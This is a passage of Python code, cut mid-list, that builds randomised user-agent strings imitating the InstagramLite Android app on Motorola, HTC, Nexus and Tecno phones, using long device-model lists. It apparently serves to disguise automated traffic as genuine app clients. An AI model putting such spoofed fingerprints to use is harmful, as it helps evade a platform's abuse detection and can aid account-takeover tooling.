'ME865', 'ME865', 'Milestone XT720', 'Motorola XT720', 'XT860', 'Moto 360', 'Motorola-F100', 'Moto C', 'Moto C Plus', 'moto e', 'Android 10 moto e', 'XT830C', 'XT1526', 'XT1023', 'XT1527', 'moto e (XT2052DL)', 'XT1528', 'XT1025', 'XT1521', 'XT1521', 'moto e13', 'MotoE2', 'moto e20', 'moto e22', 'moto e22i', 'moto e22s', 'Moto E22s', 'XT1700', 'XT1706', 'XT1706', 'moto e30', 'moto e32', 'moto e32(s)', 'Moto E (4)', 'Moto E (4)', 'Moto E (4)', 'Moto E (4)', 'Moto E (4) Plus', 'moto e40', 'moto e5', 'moto e5 (XT1920DL)', 'Moto e5', 'moto e5 cruise', 'moto e5 go', 'moto e5 play', 'moto e5 plus', 'XT1924-9', 'moto e5 supra', 'moto e6', 'moto e6 (XT2005DL)', 'moto e6 play', 'moto e(6) plus', 'moto e(6i)', 'moto e6s', 'moto e(7)', 'moto e(7) power', 'moto e(7) plus', 'moto e(7i', 'moto e(7i) power', 'moto g go', 'XT1069', 'XT1033', 'lineage_osprey', 'Moto G', 'XT1068', 'XT1039', 'XT1077', 'moto g31(w)', 'XT1045', 'XT1040', 'XT1072', 'XT1079', 'moto g 5G', 'moto g 5G (2022)', 'moto g 5G plus', 'moto g fast', 'Moto G Play', 'Moto G Play', 'moto g power', 'moto g power (2021)', 'moto g power (2022)', 'moto g pro', 'moto g pure', 'moto g stylus', 'moto g stylus (2021)', 'moto g stylus (2022)', 'moto g stylus 5G', 'moto g(10)', 'moto g(10)', 'moto g(10) power', 'moto g(100)', 'moto g13', 'XT1064', 'XT1063', 'moto g(20', 'moto g(20)', 'moto g200 5G', 'Moto G (2014', 'Moto G (2014)', 'Moto G (2015', 'Moto G (2015)', 'moto g22', 'moto g23', 'MotoG3 Java', 'moto g(30', 'moto g(30)', 'moto g32', 'Moto G (4)', 'Moto G4', 'Moto G (4)', 'XT1609', 'Moto G4 Plus', 'Moto G40', 'moto g(40) fusion', 'moto g41', 'moto g42', 'Moto G (5)', 'Moto G5 Plus (XT1686', 'Moto G (5) Plus', 'Moto G (5) Plus', 'moto g(50)', 'moto g(50) 5G', 'XT2171-3', 'moto g51 5G', 'moto g52', 'moto g52j 5G', 'moto g52j 5G', 'moto g53 5G', 'Moto G (5S)', 'XT1790', 'Moto G (5S)', 'Moto G (5S) Plus', 'moto g(6)', 'moto g(6) (XT1925DL)', 'moto g(6) forge', 'moto g(6) play', 'moto g(6) plus', 'moto g(6) plus', 'Moto g(6', 'moto g(60', 'moto g(60)', 'moto g(60)', 'moto g(60)s', 'Moto g62', 'moto g62 5G', 'moto g(7)', 'moto g(7) play', 'moto g(7) plus', 'Moto g(7', 'moto g(7) power', 'moto g(7) supra', 'moto g(7) supra', 'Moto G71', 'moto g71 5G', 'moto g72', 'moto g73 5G', 'moto g73 5G', 'moto g(8)', 'Moto g(8', 'moto g(8) play', 'moto g(8) plus', 'moto g(8) power', 'moto g(8) power lite', 'Moto G82', 'moto g82 5G', 'moto g(9)', 'moto g(9) play', 'moto g(9) plus', 'moto g(9) plus', 'Moto g(9', 'moto g(9) power', 'moto g(9) power', 'Moto G (S)', 'XT1663', 'XT1225', 'Moto MAXX', 'moto tab g70 LTE', 'XT1092', 'XT1097', 'XT1052', 'XT1055', 'XT1053', 'XT1058', 'XT1060', 'XT1056', 'XT1049', 'XT1093', 'XT1085', 'XT1580', 'XT1562', 'Moto X Play', 'XT1563', 'XT1575', 'XT1572', 'XT1570', 'XT1096', 'XT1096', 'XT2241-1', 'moto x4', 'Moto X40 Pro', 'XT882', 'XT1650', 'Moto Z', 'XT1650-05', 'XT1635-01', 'XT1635-02', 'Moto Z (2)', 'Mobile Moto Z (2', 'Moto Z2 Force', 'XT1789-05', 'Moto Z2 Play', 'XT1710-02', 'moto z3', 'Moto Z3 Play', 'moto z4', 'MOT-XT615', 'XT389', 'MOT-XT389', 'MOT-XT389', 'MotoroiX', 'MOT-XT305', 'XT303', 'MOT-XT303', 'MZ601', 'MZ601', 'MZ601', 'MZ601', 'MZ601', 'MZ601', 'MZ601', 'MZ601', 'MZ601', 'MZ601', 'MZ601', 'MZ604', 'MZ604', 'MZ604', 'MZ604', 'MZ604', 'MZ604', 'MZ604', 'MZ604', 'MZ605', 'MZ608', 'MZ608', 'MZ608', 'MZ609', 'MZ609', 'MZ616', 'MZ617', 'MZ617', 'motorola one', 'motorola one 5G', 'motorola one 5G ace', 'motorola one 5G UW', 'motorola one action', 'Motorola one action', 'motorola one fusion', 'Motorola one fusion', 'motorola one fusion+', 'motorola one hyper', 'motorola one macro', 'motorola one power', 'motorola one power', 'motorola one vision', 'motorola one zoom', 'XT1943-1', 'XT1942-1', 'XT1941-2', 'XT897', 'XT621', 'MOTPYLKIC2', 'Motorola-XT502', 'Motorola-XT502', 'Motorola-XT502', 'MB5012', 'motorola razr', 'motorola razr (2020)', 'motorola razr 2022', 'motorola razr 5G', 'Motorola RAZR MAXX', 'moto tab g20', 'Xoom', 'Xoom', 'Xoom', 'Xoom', 'Xoom', 'Xoom', 'Xoom', 'XOOM 2', 'XOOM 2', 'XOOM 2', 'XOOM 2', 'XOOM 2', 'XOOM 2', 'XOOM 2', 'XOOM 2', 'XOOM 2 ME', 'XOOM 2 ME', 'XOOM 2 ME', 'XOOM 2 ME', 'XOOM 2 ME', 'XOOM 2 ME', 'XOOM 2 ME', 'XOOM 2 ME', 'XOOM 2 ME', 'XOOM 2 ME', 'Xoom 3G', 'Xoom LTE', 'Xoom Wifi', 'XT1002', 'XT1003', 'XT1008', 'XT1019', 'XT1042', 'XT1050', 'XT1078', 'XT1098', 'XT1250', 'XT1250', 'XT1523', 'XT1523', 'XT1523', 'XT1523', 'XT1671', 'XT1675', 'XT1677', 'XT1680', 'XT1681', 'XT1683', 'Mediabox XT650', 'XT811', 'XT928'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; motorola; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Htc':
                    self.android_version = random.choice(['9', '11', '12'])
                    self.device_model = random.choice(['HTC_0P3P5', 'HTC_0P6A1', 'HTC0P6B', 'HTC 0P6B120', 'HTC_0P6B130', 'HTC 0P6B130', 'HTC 0P6B180', 'HTC_0P6B6', 'HTC 0P6B900', 'HTC_0P8B2', 'HTC 0P8B2', 'HTC_0P9O1/0.66.502.1', 'HTC 0P9O3', 'HTC 0PAG2', 'HTC 0PAJ1', 'HTC 0PAJ2', 'HTC 0PAJ3', 'HTC 0PCV20', 'HTC_0PCV22', 'HTC 0PCV22', 'HTC 0PE64', 'HTC 0PE65', 'HTC 0PF11', 'HTC_0PF110', 'HTC 0PF120', 'HTC_0PF61', 'HTC_0PFH1/1.15.502.5', 'HTC_0PFH1/1.15.502.7', 'HTC_0PFH1/1.15.502.8', 'HTC_0PFH1/1.15.502.1', 'HTC_0PFH1/1.08.502.2', 'HTC_0PFH1/2.09.502.3', 'HTC_0PFH1/2.09.502.1', 'HTC 0PFH11', 'HTC_0PFH2', 'HTC 0PFH2', 'HTC_0PFJ4', 'HTC 0PFJ4', 'HTC 0PGQ1', 'HTC_0PHC4', 'HTC 0PHC4', 'HTC 0PHC5', 'HTC_0PJA1/4.27.502.7', 'HTC_0PJA1/2.6.502.18', 'HTC_0PJA1/2.6.502.16', 'HTC_0PJA10', 'HTC 0PJA12', 'HTC 0PJX1', 'HTC 0PK72', 'HTC_0PKV1', 'HTC_0PKV2', 'HTC 0PKV2', 'HTC_0PKX2', 'HTC 0PL31', 'HTC 0PL41', 'HTC 0PL4100', 'HTC 0PL410000', 'HTC 0PL42', 'HTC 0PM11', 'HTC_0PM11', 'HTC 0PM1100', 'HTC_0PM32', 'HTC 0PM91', 'HTC 0PM912', 'HTC 0PMG2', 'HTC 10', 'HTC_M10h', 'HTC 10 evo', 'HTC_M10f', 'HTC_2PNT1', 'HTC 2PQ83', 'HTC 2PQ912', 'HTC 2PRG100', 'HTC 2PS51', 'HTC 2PS62', 'HTC 2PS6200', 'HTC 2PS63', 'HTC 2PS65', 'HTC 2PS650', 'HTC 2PST1', 'HTC 2PST2', 'HTC 2PST5', 'HTC 2PUK1', 'HTC 2PUK2', 'HTC 2PVD1', 'HTC 2PVD3', 'HTC 2PVG2', 'HTC 2PVG20', 'HTC 2PWD1', 'HTC 2PWD2', 'HTC 2PXH1', 'HTC 2PXH2', 'HTC 2PYA2', 'HTC 2PYB1', 'HTC 2PYR1', 'HTC 2PZ41', 'HTC 2PZC1', 'HTC 2PZC3', 'HTC 2PZF2', 'HTC 2PZM1', 'HTC 2PZS1', 'HTC 2Q3F1', 'HTC 2Q3F2', 'HTC 2Q3F3', 'HTC 2Q4D1', 'HTC 2Q4D3', 'HTC 2Q4R1', 'HTC 2Q4R400', 'HTC 2Q551', 'HTC 2Q551', 'HTC 2Q552', 'HTC 2Q5V1', 'HTC 2Q5V2', 'HTC 2Q5W1', 'HTC_2Q5W3', 'HTC 2Q5W3', 'HTC 2Q721', 'HTC 2Q741', 'HTC 301e', 'HTC_301e', 'HTC331ZLVW', 'HTC331ZLVWh', 'HTC331ZLVWPP', 'HTC 5060', 'HTC_5060', 'HTC 5G Hub', 'HTC 601 Dual', 'HTC_601e', 'HTC 601e', 'HTC 603e', 'HTC_603e', 'HTC_603h', 'HTC 606w', 'HTC_606w', 'HTC 608', 'HTC 609d', 'HTC-609d/1.47.1401.3', 'HTC-609d/1.47.1401.2', 'HTC-609d/1.41.1401.1', 'HTC_6160', 'HTC 6160', 'HTC 619d', 'HTC_620', 'HTC 620GSM', 'HTC6435LRA', 'NOKIA HTC6995LVW', 'HTC HTC6995LVW', 'HTC_7060', 'HTC_709d', 'HTC 709d', 'HTC-709d/1.50.1401.1', 'HTC 801s', 'HTC 803e', 'HTC_803e', 'HTC 803s', 'HTC 8060', 'HTC_8060', 'HTC 8088', 'HTC-809d/2.12.1401.6', 'HTC 809d', 'HTC 8160', 'HTC_8160', 'HTC 816G dual sim', 'HTC 820G', 'HTC_9060', 'HTC 9060', 'HTC 9088', 'HTC_9088', 'HTC 919d', 'HTC-919d/1.66.1401.1', 'HTC A100', 'htc_a16ul', 'HTC_A310e', 'HTC_A330', 'HTC-A510a', 'HTC_A510c', 'HTC A510c', 'HTC-A6366/1.0', 'HTC-A7275', 'HTCA810e', 'HTC A810e', 'HTC-A9192/1.0', 'HTC_A9sx', 'HTC A9w', 'HTC Acquire', 'ADR1776', 'HTC-ADR6290US', 'ADR6330VW', 'ADR6350', 'ADR6410LVW', 'ADR6410LVW 4G', 'ADR6425LVW', 'ADR6425LVW 4G', 'ADR9', 'ADR930L', 'ADR930L 4G', 'ADRNHRQQC1', 'ADROID BOX', 'HTC_Amaze', 'Amaze 4G', 'HTC Amaze 4G', 'Amaze_4G', 'HTC_Amaze_4G', 'Sprint APA7373KT', 'Sprint APA9292KT', 'HTC Aria', 'HTC_Aria_A6380', 'Sprint ATP515CKIT', 'HTC_Bliss_S510b', '2PYB2', 'htc_bravo', 'HTC Bravo', 'HTC bravo', 'HTC Bravo_C', 'HTC_Butterfly', 'HTC Butterfly', 'HTC_B810x', 'HTC_B830x', 'HTC Butterfly J', 'HTC Butterfly s', 'HTC_Butterfly_s', 'HTC_Butterfly_s_901s', 'HTC C2', 'HTC C510e', 'HTCC510e', 'HTC_C525c', 'HTC_C525u', 'HTC_C715c', 'HTC_ChaCha', 'HTC ChaCha', 'HTC_ChaCha_A810b', 'HTC ChaCha A810e', 'HTC_ChaCha_A810e', 'HTC Click', 'HTC D10 pro', 'HTCD100LVW', 'HTC_D10u', 'HTC D10w', 'HTC D310w', 'HTC D316d', 'HTC D510', 'HTC_D510', 'HTC D516', 'HTC_D516', 'HTC-D516d', 'HTC D516d', 'HTC D516t', 'HTC D516w', 'HTC_D516w', 'HTC_D530u', 'HTC D539', 'HTC D610', 'HTC_D610', 'HTC D610t', 'HTC_D610t', 'HTC D616w', 'HTC_D616w', 'HTC_D620u', 'HTC D626', 'HTC D626d', 'HTC_D626h', 'HTC_D626q', 'HTC D626t', 'HTC_D626t', 'HTC D626w', 'HTC_D626w', 'HTC_D626x', 'HTC D628h', 'HTC_D628u', 'HTC_D630x', 'HTC_D650h', 'HTC D728', 'HTC D728w', 'HTC_D728x', 'HTC D816', 'HTC D816d', 'HTC D816e', 'HTC_D816e', 'HTC D816t', 'HTC_D816t', 'HTC D816v', 'HTC D816w', 'HTC_D816W', 'HTC_D816w', 'HTC D820', 'HTC_D820f', 'HTC_D820G', 'vi HTC_D820m', 'HTC_D820s', 'HTC D820s', 'HTC D820t', 'HTC_D820t', 'HTC_D820ts', 'HTC D820ts', 'HTC_D820ys', 'HTC_D825u', 'HTC_D826', 'HTC D826', 'HTC D826d', 'HTC D826t', 'HTC_D826t', 'HTC D826w', 'HTC_D826w', 'HTC_D826y', 'HTC_D828g', 'HTC_D828w', 'HTC D828w', 'HTC_D828x', 'HTC D830u', 'HTC_D830x', 'HTC Desire', 'HTC Desire 10 pro', 'HTC_D10i', 'Desire 11', 'HTC Desire 12', 'HTC Desire 12', 'HTC Desire 12+', 'HTC Desire 12s', 'HTC Desire 19', 'HTC Desire 19+', 'HTC Desire 19s', 'HTC Desire 20', 'HTC Desire 20 Pro', 'HTC Desire 20+', 'HTC Desire 200', 'HTC_Desire_200', 'HTC Desire 21 pro 5G', 'HTC Desire 22 pro', 'HTC_Desire_300', 'HTC Desire 300', 'HTC Desire 310', 'HTC_Desire_310', 'HTC_D310n', 'HTC Desire 320', 'HTC_Desire_320', 'HTC Desire 380', 'HTC Desire 5 plus', 'HTC Desire 500', 'HTC_Desire_500', 'Desire 500 Plus', 'HTC Desire 508', 'HTC Desire 510', '0PCV1', 'HTC_Desire_510', 'HTC Desire 512', 'HTC Desire 520', 'HTCD100LVWPP', 'HTC_D526h', 'HTCD526h', 'HTC Desire 526', 'HTC Desire 526G', 'HTC Desire 526g dug', 'HTC Desire 530', 'HTCD160LVWPP', 'HTC Desire 550', 'HTC Desire 555', 'HTC_Desire_600', 'HTC Desire 600', 'HTC Desire 601', 'HTC_Desire_601', 'HTC Desire 608', 'HTC 608t', 'HTC Desire 610', 'HTC_D610x', 'HTC_Desire_610', 'HTC_0P9O2', 'HTC Desire 612', 'HTC_Desire_612', 'Desire 619d', 'HTC Desire 620', 'HTC_Desire_620', 'HTC_D620h', 'Desire 620G', 'Desire 620g', 'HTC Desire 625', 'HTC_D626ph', 'HTC Desire 626', 'HTCD200LVWPP', 'HTC_Desire_626', 'HTC Desire 626G', 'HTC Desire 626s', '0PM92', 'HTC Desire 628', 'Desire 630DS', 'HTC Desire 650', 'HTC_Desire_709d', '710C', 'HTC Desire 728', 'HTC Desire 816', 'HTC_D816x', 'HTC Desire 816G', 'HTC_Desire_816G', 'HTC Desire 820', 'HTC_0PFJ50', 'HTC D820u', 'HTC_D820u', 'HTC Desire 820us', 'HTC Desire 825', 'HTC Desire 826', 'Desire 826W', 'HTC Desire 828', 'HTC Desire 830', 'Desire 830G', 'Desire 838', 'HTC Desire 860', 'HTC_Desire_A8181', 'Desire_A8181', 'HTC Desire C', 'HTC_Desire_C', 'HTC Desire EYE', 'HTC Desire Eye', 'HTC Desire HD', 'HTC_Desire_HD', 'Desire HD', 'HTC Desire HD A9191', 'HTC_Desire HD_G10', 'desire l', 'HTC Desire P', 'HTC_Desire_P', 'desire p', 'Desire Pro', 'HTC_Desire_Q', 'desire q', 'HTC Desire Q', 'Desire S', 'HTC Desire S', 'HTC_Desire_S_S510e', 'DL Desire Series', 'HTC_Desire_SMS', 'Desire_Strong', 'HTC Desire SV', 'HTC_Desire_U', 'HTC Desire V', 'HTC_Desire_V', 'HTC_Desire_VC', 'HTC Desire VC', 'HTC_Desire_VC_T328d', 'HTC Desire VC T328d', 'desire vt', 'HTC_Desire_X', 'HTC Desire X', 'HTC_Desire_XS', 'HTC Desire XS', 'HTC Desire Z', 'Desire Z', 'HTC_Desire_Z', 'HTC_DesireHD', 'HTC_DesireHD_A9190', 'HTC_DesireHD_A9191', 'HTC_DesireHD_A9192', 'HTC_DesireHD_X315e', 'HTC_DesireS', 'HTC_DesireS_S510b', 'HTC_DesireS_S510e', 'HTC_DesireSV', 'HTC_DesireU', 'HTC_DesireX_A7272', 'HTC_DesireZ_A722', 'HTC_DesireZ_A7272', 'HTC Dezire 816', 'Htc Dezire Z', 'HTC Dream', 'HTC_Dream', 'HTC Dream G1', 'HTC6435LVW 4G', 'HTC6435LVW4G', 'ADR6300', 'ADR6410LRA', 'HTC DSIRE 620G', 'HTC_E9_Plus', 'HTC E9 Plus', 'HTC E9plus', 'HTC E9pt', 'HTC_E9sx', 'HTC E9t', 'HTC E9w', 'HTC_E9w', 'HTC EVA_UL', 'HTC EVA_UTL', 'HTC Evo 3d/EVO', 'Evo 3D GSM', 'HTC EVO 3D GSM', 'HTC EVO 3D X515a', 'HTC EVO 3D X515m', 'HTC_EVO_3D_X515m', 'PG86100', 'HTC Evo 3d/PG86100', 'HTC PG86100', 'PC36100', 'HTC_EVO_4G', 'HTC EVO 4G LTE', 'HTC_EVO_Design_C715e', 'HTC_Evo_Lte_PJ751', 'HTC EVO View 4G', 'HTC_EVO3D_X515a', 'EVO3D_X515m', 'HTC_EVO3D_X515m', 'EXODUS 1', 'HTC Exodus 1s', 'HTC Explorer', 'HTC_Explorer', 'HTC_Explorer_A310b', 'HTC Explorer A310e', 'HTC_Explorer_A310e', 'HTCExplorerA310e', 'HTC Express', 'HTC first', 'HTC Flyer', 'HTCFlyer', 'HTC_Flyer', 'HTC Flyer P510e', 'HTC_Flyer_P510e', 'HTC Flyer P512', 'HTCFlyerP512', 'HTC_G17', 'HTC_G18', 'HTC_G19', 'T-Mobile HTC_G2', 'HTC Glacier', 'HTC_Glacier', 'HTCGlacier', 'HTC_GOF_U', 'HTC Gone X', 'HTC_Gratia_A6380', 'HTC_H1000C', 'HTC_H2000C', 'HTC_H3000C', 'HTCH3000C', 'HTC HD2', 'NexusHD2', 'HTC HD2 Leo', 'HTC HD7', 'HTC HD7 T9299', 'HTC Hero', 'HTC_HERO', 'HTC Hero S', 'HTC Holiday', 'HTC_Holiday', 'HTC Incredible', 'HTC Incredible 2', 'HTC_Incredible_A6300', 'HTC Incredible S', 'HTC_IncredibleS_S45e', 'IncredibleS_S710e', 'HTC Inspire 3D', 'HTC_Inspire_4G', 'ISW13HT', 'HTV31', 'HTL23', 'HTL22', 'HTC J One', 'HTC HTL22', 'HTC J Z321e', 'HTC Kingdom', 'HTC_Kingdom', 'HTC Lead', 'HTC Legend', 'HTC_Lexikon', 'HTC_Lexikon_C', 'HTC Lexikon_C', 'HTC Liberty', 'HTC M10', 'HTC M10u', 'htc m7', 'HTC M8', 'htc_m8', 'HTC-M8d/3.34.1401.1', 'HTC M8e', 'HTC M8Et', 'HTC_M8Et', 'HTC M8Sd', 'HTC M8sd', 'HTC M8si', 'HTC_M8si', 'HTC M8St', 'HTC_M8St', 'HTC_M8Sy', 'HTC M8t', 'HTC_M8t', 'HTC M8v', 'HTC M8w', 'HTC_M8w', 'HTCM8x', 'HTC M9 plus', 'HTC_M910x', 'HTC_M9e', 'HTC_M9ew', 'HTCM9pw', 'HTC_M9px', 'HTC Magic', 'HTC Magic/Dream', 'HTC_Marvel', 'HTC_Mecha', 'HTC Mecha', 'HTC Merge', 'HTC_PN071', 'HTC_802w', 'HTC One', 'HTC 802t', 'HTC M8Sw', 'HTC_M8Sw', 'HTC One M8D', 'HTC One 801s', 'HTC_One_802w', 'HTC One A9', 'HTC_A9u', 'HTC One A9s', 'arm_64 HTC One A9s', 'HTC One dual sim', 'HTC_M8Sx', '0PAJ5', 'HTC One_E8', 'HTC One_E8 dual sim', 'HTC One_E8W', 'HTC_E9x', 'HTC One E9', 'HTC One E9 dual sim', 'HTC_E9pw', 'HTC E9pw', 'HTC One E9s dual sim', 'HTC One M10', 'HTCPN071', 'HTC6500LVW', 'HTC6500LVW 4G', 'HTC One_M7', 'HTC One m7', 'HTC One_M8', 'HTC6525LVW', 'HTC One_M8 dual sim', 'HTC_One_M8_Eye', 'HTC One_M8 Eye', 'HTC One M8s', 'HTC One M9', 'HTC6535LVW', 'HTC M9w', 'HTC M9et', 'HTC_M9u', 'HTC One M9PLUS', 'HTC One M9 Plus', 'HTC_M9pw', 'HTC One M9s', 'HTC One max', 'HTC0P3P7', 'HTC_One_max', 'HTC6600LVW', 'HTC One ME', 'HTC One ME dual sim', 'HTC One mini', 'HTC_One_mini', 'HTC_PO582', 'HTC One mini 2', 'HTCOnemini2', 'One Mini 2', 'HTC_One_mini_2', 'HTC_One_mini_601e', 'HTC6515LVW', 'One S', 'HTC One S', 'HTC_One_S/3.16.161.9', 'HTC_One_S', 'HTC_S9u', 'HTC One S9', 'HTC_One_SC', 'HTC One SC', 'HTC One SV', 'HTC One V', 'HTC_One_V', 'HTC One VX', 'One X', 'HTC One X', 'HTC_One_X/4.17.161.2', 'HTC_One_X', 'PJ83100/2.20.502.7', 'Life One X', 'HTC One X10', 'HTC 2PXH3', 'X2-HT', 'HTC 2PS5200', 'HTC One X9', 'HTC One X9 dual sim', 'HTC One XL', 'HTC_One_XL', 'HTC OneM8', 'HTC_OneSV', 'HTC_OneXplus', 'HTC_P515E', 'HTC-P715a', 'HTC Panache', 'HTC PG09410', 'HTC-PG762', 'HTC PH39100', 'HTC PLS7373ADR', 'HTC_PM33100', 'HTC PM6014', 'HTC_PN072', 'HTC PN072', 'HTC_PN074', 'HTC PO461', 'HTC_PO601', 'HTC PO601', 'HTC_PO682', 'HTC PO682', 'HTC_POO_U', 'HTC POO_U', 'HTC Pyramid', 'HTC_Pyramid', 'HTC Raider', 'HTC_Raider_X710e', 'HTCRaiderX710e', 'Infected HTC Rezound', 'HTC Rezound', 'HTC Rhyme', 'HTC Rhyme/ADR6330VW', 'HTC Rhyme S510b', 'HTC_Rhyme_S510b', 'HTC_Ruby', 'HTC Ruby', 'HTC_Runnymede', 'HTC Runnymede', 'HTC_S510b', 'HTC S510b', 'HTC_S610d', 'HTC S610d', 'HTC S710d', 'HTCS710e', 'HTC_S710E', 'HTC S715e', 'HTC_S715e', 'HTC S720e', 'HTC S720t', 'HTC_Salsa_C510b', 'HTC Salsa C510e', 'HTC_Salsa_C510e', 'HTC Sensation', 'HTC_Sensation', 'HTC Sensation 4G', 'Sensation_4G', 'HTC_Sensation_4G', 'Sensation XL', 'HTC_Sensation_Z710a', 'Sensation_Z710e', 'HTC Sensation Z710e', 'HTC_Sensation_Z710e', 'HTC Sprint One', 'HTC Status', 'HTC_T120C', 'HTC T320e', 'HTC T327d', 'HTC T327t', 'HTC T327w', 'HTC_T327w', 'HTC T328d', 'xx HTC T328d', 'HTC_T328d', 'HTC T328t', 'HTC_T328t', 'HTC T328w', 'HTC_T328w', 'HTC T329d', 'HTC T329t', 'HTC_T329w', 'HTC T329w', 'HTC T528d', 'HTC T528t', 'HTC T528w', 'HTC_T528w', 'HTC T8585', 'HTC T9299', 'HTC Tattoo', 'en HTC Tattoo', 'ADR6400L 4G', 'HTC U Play', 'HTC 2PZM3', 'HTC_U-1u', 'HTC U Ultra', 'HTC 2PZF1', 'HTC_U-3u', 'HTC U11', 'HTV33', '601HT', 'HTC 2Q4R100', 'HTC U11 life', 'HTC U11 plus', 'HTC_2Q4D100', 'HTC U12', 'HTC 2Q6E1', 'HTC 2Q55100', 'HTC 2Q7A100', 'HTC U20 5G', 'HTC Velocity 4G', 'HTC Vision', 'De-Sensed HTC Vivid', 'HTC Vivid 4G', 'HTC Wildfire', 'HTC_Wildfire', 'HTC_Wildfire_A3333', 'Wildfire E', 'Wildfire E Lite', 'Wildfire E plus', 'Wildfire E star', 'HTC Wildfire E1', 'arm Wildfire E1', 'Wildfire E1 Plus', 'Wildfire E2', 'Wildfire E2 plus', 'Wildfire E3', 'Wildfire R70', 'Wildfire S', 'HTC Wildfire S', 'HTC_Wildfire_S', 'HTC Wildfire S A510b', 'Wildfire S A510e', 'HTC Wildfire S A510e', 'HTC_Wildfire_S_A510e', 'HTC Wildfire V1', 'HTC Wildfire X', 'HTC_WildfireS', 'HTC_WildfireS_A510e', 'HTC X10', 'HTC_X10u', 'HTC-X315E', 'HTC_X315e', 'HTC_X515C', 'HTC X515d', 'HTC_X515E', 'HTC X515e', 'HTC X515m', 'HTC-X710a', 'HTC X720d', 'HTC X920e', 'HTC_X920e', 'HTC_X9u', 'HTC X9u', 'HTC_Z560e', 'HTC Z560e', 'HTC-Z710a', 'HTC Z710e', 'HTC Z710t', 'HTC Z715e', 'HTC_Z715e'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; HTC/htc; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Nexus':
                    self.android_version = random.choice(['9', '10'])
                    self.device_model = random.choice(['Galaxy Nexus', 'Nexus 10', 'Nexus 2', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 5', 'phone/Nexus 5', 'Nexus 5X', 'Nexus 6', 'Nexus 7', 'Nexus 9', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus Player', 'Nexus Player', 'Nexus S', 'Nexus S', 'Nexus S 4G', 'nexus S', 'Nexus S', 'Nexus s', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36 InstagramLite 3.0.0.7.78 Android ({}/{}; {}; LGE/google; {}; marlin; qcom; in_ID; 117883409)'.format(self.android_version, self.device_model, self.browser_version, self.Android_Version(self.android_version), self.android_version, self.dpi_pixel, self.device_model))
                elif self.jenis == 'Tecno':
                    self.android_version = random.choice(['10', '9', '11'])
                    self.device_model = random.choice(['Tecno 510', 'TECNO 7CS', 'TECNO 836', 'TECNO 8H', 'Tecno 8h', 'Tecno A3800', 'Tecno A4S', 'TECNO A571LS', 'Tecno A580', 'Tecno A602', 'Tecno A858t', 'Tecno A88', 'Tecno_A88', 'Tecno AL58', 'Tecno AL86', 'TECNO B1S', 'TECNO B2', 'TECNO-J8', 'TECNO-C5', 'TECNO-C5S', 'TECNO-C7', 'TECNO-C8', 'TECNO CF7', 'TECNO CF7k', 'TECNO CF7S', 'TECNO CF8', 'TECNO CC7', 'TECNO CC7S', 'TECNO CC6', 'TECNO KC3', 'TECNO CC9', 'TECNO CD7', 'en TECNO CD7', 'TECNO CD6', 'TECNO CD6S', 'TECNO CD8j', 'TECNO CE7', 'TECNO CE9h', 'TECNO CE9', 'TECNO CE8', 'TECNO CD6j', 'TECNO CE7j', 'TECNO CG6', 'TECNO CG6j', 'TECNO CG8', 'TECNO CG8h', 'TECNO CG7', 'TECNO CH6n', 'TECNO CH6h', 'TECNO Mobile CH9n', 'TECNO CH9n', 'TECNO CH9', 'TECNO CH7n', 'TECNO CH7', 'TECNO CI6', 'TECNO CH6i', 'TECNO CI8n', 'TECNO CI7n', 'TECNO-C9', 'TECNO CA6', 'TECNO CA6S', 'TECNO Camon CX', 'TECNO CX Air', 'TECNO Camon CXS', 'TECNO IN5', 'TECNO ID5a', 'TECNO ID5b', 'TECNO CB7', 'TECNO CB7j', 'TECNO KB2', 'TECNO ID3k', 'TECNO ID6', 'TECNO IN2', 'TECNO IN1 Pro', 'en TECNO IN1 Pro', 'TECNO KB3', 'TECNO IA5', 'TECNO CA7', 'TECNO CA8', 'TECNO Comon CX', 'TECNO D1', 'TECNO D3', 'TECNO DP10A', 'TECNO DP7CPRO', 'TECNO DP10A Pro', 'TECNO P904', 'TECNO DP7C Pro-SGA1', 'TECNO P701', 'TECNO P703', 'TECNO P704a', 'TECNO DP8D', 'TECNO P702AS', 'TECNO F1', 'ar_AE TECNO F1', 'ar_EG TECNO F1', 'Tecno F177', 'TECNO F2', 'TECNO F2LTE', 'TECNO F4', 'ar_AE TECNO F4', 'TECNO F4 Pro', 'TECNO F7', 'TECNO F8', 'Tecno F9', 'Tecno G628', 'TECNO G9', 'TECNO H5', 'TECNO H6', 'H818', 'TECNO i3', 'TECNO i3 Pro', 'TECNO i5', 'TECNO i5 Pro', 'TECNO i7', 'TECNO IN3', 'TECNO IN6', 'en TECNO IN6', 'TECNO-J5', 'TECNO-J7', 'Tecno K18', 'Tecno K88', 'TECNO KH7S', 'L3', 'TECNO-L5', 'TECNO L6', 'TECNO-L8', 'TECNO L8 Lite', 'TECNO_L8_Lite', 'TECNO-L8Plus', 'TECNO L9', 'TECNO L9 Plus', 'TECNO M3', 'TECNO M6', 'TECNO M7', 'Tecno M821', 'TECNO M9', 'Tecno M9S', 'TECNO Mobile BF7n', 'TECNO-N2', 'TECNO-N2S', 'TECNO N3', 'TECNO N5', 'TECNO-N6', 'TECNO-N6S', 'TECNO_N7', 'TECNO-N8', 'TECNO-N8S', 'Tecno N9', 'TECNO-N9', 'TECNO_N9', 'TECNO-N9S', 'Tecno Note3', 'TECNO P3', 'TECNO P3S', 'TECNO P5', 'TECNO P9', 'PHANTOM5', 'Phantom6', 'PHANTOM6', 'Phantom6S', 'Phantom6-Plus', 